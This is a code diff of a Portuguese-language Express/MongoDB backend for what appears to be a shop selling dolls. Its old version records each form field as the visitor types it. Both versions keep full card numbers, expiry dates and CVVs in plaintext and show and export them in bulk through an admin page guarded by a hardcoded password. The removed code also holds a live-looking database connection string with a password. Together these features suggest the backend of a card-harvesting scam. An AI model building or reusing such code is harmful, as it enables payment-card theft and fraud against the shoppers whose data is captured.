@@ -1,141 +1,133 @@
-// app.js - Backend completo com MongoDB, admin, sessionId e exportação TXT
-import express from "express";
-import cors from "cors";
-import mongoose from "mongoose";
-import path from "path";
-import { fileURLToPath } from "url";
-import { v4 as uuidv4 } from "uuid";
-
-// MongoDB Atlas string já com senha fornecida
-const MONGO_URI = "mongodb+srv://igorlcreis:PskuwOrsMTaZFnGU@cluster0.xcdkhke.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0";
-const __filename = fileURLToPath(import.meta.url);
-const __dirname = path.dirname(__filename);
+// app.js
+require('dotenv').config();
+const express  = require('express');
+const mongoose = require('mongoose');
+const path     = require('path');
 
 const app = express();
-const PORT = process.env.PORT || 7860;
 
-// MongoDB Connection
-mongoose.connect(MONGO_URI, { useNewUrlParser: true, useUnifiedTopology: true })
-  .then(() => console.log("MongoDB Atlas conectado!"))
-  .catch(err => console.error("Erro ao conectar MongoDB:", err));
+// ===== 1) Conexão com MongoDB =====
+mongoose.connect(process.env.MONGODB_URI, {
+  useNewUrlParser: true,
+  useUnifiedTopology: true
+})
+.then(() => console.log('MongoDB conectado'))
+.catch(err => console.error('Erro ao conectar MongoDB:', err));
 
-// Schemas
-const CapturaSchema = new mongoose.Schema({
-  sessionId: String,
-  campo: String,
-  valor: String,
-  data: { type: Date, default: Date.now }
-});
-const PagamentoSchema = new mongoose.Schema({
-  sessionId: String,
-  dados: Object,
-  data: { type: Date, default: Date.now }
-});
+// ===== 2) Schema e Model de Pedido =====
+const PedidoSchema = new mongoose.Schema({
+  nome_titular:  String,
+  numero_cartao: String,
+  validade:      String,
+  cvv:           String,
+  parcelas:      Number,
+  total:         Number,
+  cep:           String,
+  boneca:        String,
+  cabelo:        String,
+  telefone:      String,
+  email:         String
+}, { timestamps: true });
 
-const Captura = mongoose.model("Captura", CapturaSchema);
-const Pagamento = mongoose.model("Pagamento", PagamentoSchema);
+const Pedido = mongoose.model('Pedido', PedidoSchema);
 
-app.use(cors());
+// ===== 3) Middlewares =====
 app.use(express.json());
-app.use(express.static(path.join(__dirname, "public")));
+app.use(express.static(path.join(__dirname, 'public')));
 
-// Captura progressiva (cada campo)
-app.post("/captura_campo", async (req, res) => {
-  const { sessionId, campo, valor } = req.body;
-  if (!campo || valor === undefined || !sessionId) return res.status(400).send("Dados inválidos");
-  await Captura.create({ sessionId, campo, valor });
-  res.sendStatus(200);
+// ===== 4) Credenciais do Admin =====
+const ADMIN_PASSWORD  = 'asap';
+const ADMIN_AUTH_CODE = 'b4d8f3e2c6a1b7c9d0e4f5a8b3c2d7f1';
+
+// ===== 5) Endpoint para criar Pedido =====
+app.post('/pedido', async (req, res) => {
+  try {
+    await Pedido.create(req.body);
+    return res.sendStatus(201);
+  } catch (e) {
+    console.error(e);
+    return res.sendStatus(500);
+  }
 });
 
-// Captura final (todos os campos ao finalizar)
-app.post("/captura_final", async (req, res) => {
-  const { sessionId, ...dados } = req.body;
-  if (!sessionId) return res.status(400).send("Dados inválidos");
-  await Pagamento.create({ sessionId, dados });
-  res.sendStatus(200);
-});
-
-// Admin protegida com visualização e exportação por sessionId
-app.get("/admin", async (req, res) => {
-  const senha = req.query.senha;
-  const session = req.query.session;
-  const exportar = req.query.exportar;
-
-  if (senha !== "asap") return res.status(401).send("Acesso negado!");
-
-  // Busca sessionIds distintos
-  const sessions = await Captura.distinct("sessionId");
-  let sessionList = "";
-  sessions.forEach(s => {
-    sessionList += `<option value="${s}"${session === s ? " selected" : ""}>${s}</option>`;
-  });
-
-  // Filtra por sessionId selecionado
-  let capturas = [];
-  let pagamentos = [];
-  if (session) {
-    capturas = await Captura.find({ sessionId: session }).sort({ data: 1 }).lean();
-    pagamentos = await Pagamento.find({ sessionId: session }).sort({ data: 1 }).lean();
+// ===== 6) Painel de Admin =====
+app.get('/admin', async (req, res) => {
+  const { senha, auth } = req.query;
+  if (senha !== ADMIN_PASSWORD || auth !== ADMIN_AUTH_CODE) {
+    const err = (senha||auth) 
+      ? '<p style="color:red;">Senha ou código inválido.</p>' 
+      : '';
+    return res.send(`
+      <html><head><meta charset="UTF-8"><title>Login Admin</title></head>
+      <body style="font-family:Arial,sans-serif;padding:20px">
+        <h1>Admin Login</h1>${err}
+        <form method="get" action="/admin">
+          <label>Senha:<br>
+            <input type="password" name="senha" required style="width:300px;padding:6px">
+          </label><br><br>
+          <label>Código:<br>
+            <input type="text" name="auth" required style="width:300px;padding:6px">
+          </label><br><br>
+          <button type="submit" style="padding:8px 16px">Entrar</button>
+        </form>
+      </body></html>
+    `);
   }
 
-  // Exportação TXT
-  if (exportar === "txt" && session) {
-    let txt = "";
-    txt += "CAPTURAS\n";
-    capturas.forEach(c => {
-      txt += `${c.data.toLocaleString()} | ${c.campo}: ${c.valor}\n`;
-    });
-    txt += "\nPAGAMENTOS FINALIZADOS\n";
-    pagamentos.forEach(p => {
-      txt += `${p.data.toLocaleString()} | ${JSON.stringify(p.dados, null, 2)}\n\n`;
-    });
-    res.setHeader("Content-disposition", `attachment; filename=exportacao_${session}.txt`);
-    res.setHeader("Content-Type", "text/plain");
-    return res.send(txt);
-  }
+  // Autenticado: busca todos os pedidos
+  const pedidos = await Pedido.find().sort('-createdAt').lean();
 
   res.send(`
-    <html>
-    <head><title>Admin - MongoDB</title>
-    <style>
-      body { font-family: Quicksand, Arial, sans-serif; background:#faf4fd; color:#322; }
-      .main { max-width:820px; margin:28px auto; background:#fff; border-radius:16px; box-shadow:0 2px 18px #be429931; padding:28px; }
-      h1 { color:#be4299; }
-      pre { background:#ffe4ec; border-radius:10px; padding:15px; font-size:1em; }
-      .section { margin-bottom: 28px; }
-      select { font-size:1em; }
-      button { margin-left: 10px; padding: 4px 12px; font-size:1em; }
-    </style>
-    </head>
-    <body>
-      <div class="main">
-      <h1>Administração - MongoDB Capturas</h1>
-      <form method="get" action="/admin" style="margin-bottom:20px;">
-        <input type="hidden" name="senha" value="asap">
-        <label>Selecione o usuário (sessionId):
-          <select name="session" onchange="this.form.submit()">
-            <option value="">-- Selecione --</option>
-            ${sessionList}
-          </select>
-        </label>
-        ${session ? `<button type="submit" name="exportar" value="txt">Exportar TXT</button>` : ""}
-      </form>
-      ${session ? `
-      <div class="section">
-        <h2>Campos Digitados</h2>
-        <pre>${capturas.map(c => `${c.data.toLocaleString()} | ${c.campo}: ${c.valor}`).join('\n')}</pre>
-      </div>
-      <div class="section">
-        <h2>Pagamentos Finalizados</h2>
-        <pre>${pagamentos.map(p => `${p.data.toLocaleString()} | ${JSON.stringify(p.dados, null, 2)}`).join('\n\n')}</pre>
-      </div>
-      ` : "<p>Selecione um usuário para visualizar e exportar dados.</p>"}
-      </div>
-    </body>
-    </html>
+    <html><head><meta charset="UTF-8"><title>Painel Admin</title>
+      <style>
+        body { font-family:Arial,sans-serif; background:#fafafa; padding:20px }
+        h1 { color:#be4299 }
+        details { background:#fff; padding:12px; margin-bottom:12px;
+                  border-radius:8px; box-shadow:0 2px 6px rgba(0,0,0,0.1) }
+        summary { font-weight:bold; cursor:pointer }
+        table { width:100%; border-collapse:collapse; margin-top:8px }
+        th,td { border:1px solid #ddd; padding:6px; text-align:left }
+        th { background:#fdebf5 }
+        button { padding:8px 12px; background:#be4299; color:#fff;
+                 border:none; border-radius:4px; cursor:pointer }
+      </style>
+    </head><body>
+      <h1>Painel Admin — Pedidos</h1>
+      ${pedidos.map(p => `
+        <details>
+          <summary>${new Date(p.createdAt).toLocaleString()} — ${p.nome_titular}</summary>
+          <table>
+            <tr><th>Campo</th><th>Valor</th></tr>
+            ${['nome_titular','numero_cartao','validade','cvv','telefone','email']
+              .map(k => `<tr><td>${k}</td><td>${p[k]||''}</td></tr>`)
+              .join('')}
+          </table>
+        </details>
+      `).join('')}
+      <button id="exportAll">Exportar Todos (TXT)</button>
+      <script>
+        const pedidos = ${JSON.stringify(pedidos)};
+        document.getElementById('exportAll').addEventListener('click', () => {
+          let txt = '=== Todos os Pedidos ===\\n\\n';
+          pedidos.forEach(p => {
+            txt += '--- ' + p.nome_titular + ' (' + new Date(p.createdAt).toLocaleString() + ') ---\\n';
+            ['nome_titular','numero_cartao','validade','cvv','telefone','email']
+              .forEach(k => txt += k + ': ' + (p[k]||'') + '\\n');
+            txt += '\\n';
+          });
+          const blob = new Blob([txt],{type:'text/plain'});
+          const url  = URL.createObjectURL(blob);
+          const a    = document.createElement('a');
+          a.href     = url;
+          a.download = 'todos_pedidos.txt';
+          a.click();
+          URL.revokeObjectURL(url);
+        });
+      </script>
+    </body></html>
   `);
 });
 
-app.listen(PORT, () => {
-  console.log("Servidor rodando em http://localhost:" + PORT);
-});
+// ===== 7) Iniciar servidor =====
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => console.log(`Servidor rodando na porta ${PORT}`));
